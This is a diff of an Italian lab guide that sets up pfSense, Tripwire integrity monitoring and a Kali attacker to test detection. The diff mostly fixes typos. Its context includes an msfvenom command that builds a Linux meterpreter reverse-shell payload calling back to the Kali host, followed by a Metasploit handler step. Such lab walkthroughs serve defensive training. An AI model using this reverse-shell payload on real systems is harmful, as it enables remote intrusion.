@@ -69,7 +69,6 @@ L'indirizzamento è riportato nella tabella sottostante.
 
 Di seguito verranno esplicitati tutti i passi di configurazione degli strumenti e la simulazione degli attacchi.
 
-> Nota: gli indirizzi assegnati dinamicamente potrebbero variare ad ogni avvio delle macchine. Per maggiore sicurezza assegnarli manualmente.
 
 ## Configurazione
 Il primo componente inserito all'interno della rete è Pfsense, una distribuzione firewall open-source basata sul sistema operativo FreeBSD. Una volta avviata e configurata la macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN (la rete virtuale interna). Per impostarlo basterà attivare il menù `2) Set interface(s) IP address` e successivamente selezionare l'interfaccia LAN (nel caso in questione la numero `2`).  Una volta configurato l'indirizzo IPv4 dell'interfaccia come `172.16.0.1/24` è stato abilitato anche il server DHCP con il seguente range di indirizzi: `172.16.0.50 - 172.16.0.52` (questo operazione eviterà successivamente di impostare manualmente l'indirizzo della macchina `Ubuntu`). 
@@ -223,7 +222,7 @@ Wrote database file: /var/lib/tripwire/tripit.twd
 The database was successfully generated.
 ```
 
-> Nota: se i *warings* persistono rieseguire la procedura con i file indicati  
+> Nota: se i *warnings* persistono rieseguire la procedura con i file indicati  
 
 ## Test Tripwire
 Per effettuare l'attacco la macchina `Kali` necessita di avere installato python3. 
@@ -245,7 +244,7 @@ ifconfig
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
 ```
 
- **3° Terminale**: Ora tramite metaspoilt avvieremo l'*handler* che attenderà l'instaurazione di una *Meterpeter session* verso il `target`
+ **3° Terminale**: Ora tramite metasploit avvieremo l'*handler* che attenderà l'instaurazione di una *Meterpeter session* verso il `target`
 ```bash
 msfconsle
 ```
